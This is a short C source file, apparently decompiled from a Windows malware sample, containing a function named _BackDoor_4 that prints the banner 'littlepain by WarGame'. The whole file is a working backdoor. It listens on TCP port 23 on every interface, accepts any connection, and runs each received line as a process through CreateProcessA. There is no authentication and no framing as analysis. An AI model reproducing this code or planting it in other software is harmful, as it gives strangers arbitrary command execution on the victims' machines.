#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

DWORD WINAPI _BackDoor_4(LPVOID Data)
{
    int iVar1;
    uint32_t uVar2;
    BOOL BVar3;
    PROCESS_INFORMATION local_28c;
    STARTUPINFOA local_27c;
    char local_238[260];
    fd_set local_134;
    struct timeval local_30;
    struct sockaddr_in local_28;
    SOCKET local_18;
    SOCKET local_14;

    local_14 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (local_14 != INVALID_SOCKET) {
        local_28.sin_family = AF_INET;
        local_28.sin_addr.s_addr = htonl(INADDR_ANY);
        local_28.sin_port = htons(23);
        iVar1 = bind(local_14, (struct sockaddr *)&local_28, sizeof(struct sockaddr_in));
        if (iVar1 != -1) {
            listen(local_14, SOMAXCONN);
            do {
                local_18 = accept(local_14, NULL, NULL);
                local_30.tv_usec = 0;
                local_30.tv_sec = 60;
                local_134.fd_count = 1;
                local_134.fd_array[0] = local_18;
                send(local_18, "[:: littlepain ::] by WarGame\r\n", 31, 0);
                while (iVar1 = select(local_18 + 1, &local_134, NULL, NULL, &local_30), iVar1 > 0) {
                    memset(local_238, 0, sizeof(local_238));
                    recv(local_18, local_238, sizeof(local_238), 0);
                    uVar2 = strlen(local_238);
                    for (uint32_t local_10 = 0; local_10 < uVar2; local_10++) {
                        if ((local_238[local_10] == '\r') || (local_238[local_10] == '\n')) {
                            local_238[local_10] = '\0';
                        }
                    }
                    memset(&local_27c, 0, sizeof(local_27c));
                    memset(&local_28c, 0, sizeof(local_28c));
                    local_27c.cb = sizeof(STARTUPINFOA);
                    local_27c.dwFlags = STARTF_USESHOWWINDOW;
                    local_27c.wShowWindow = SW_SHOW;
                    BVar3 = CreateProcessA(NULL, local_238, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &local_27c, &local_28c);
                    if (BVar3 == 0) {
                        send(local_18, "Not Executed!\r\n", 15, 0);
                    }
                    else {
                        send(local_18, "Executed!\r\n", 11, 0);
                    }
                }
                closesocket(local_18);
            } while (true);
        }
    }
    return 0;
}
